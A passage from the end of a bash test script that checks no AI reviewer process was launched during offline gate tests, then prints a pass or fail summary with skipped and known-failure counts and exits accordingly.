    printf 'FAIL a reviewer was started: %s\n' "$(tr '\n' ';' <"$AI_CALLED")"
    FAILURES=$((FAILURES + 1))
else
    printf 'ok   no reviewer was started\n'
fi
if [[ $FAILURES == 0 ]]; then
    printf 'ALL OFFLINE GATE TESTS PASSED (%d skipped, %d known failure(s))\n' "$SKIPPED" "$KNOWN"
    exit 0
fi
printf '%d OFFLINE GATE TEST(S) FAILED\n' "$FAILURES"
exit 1
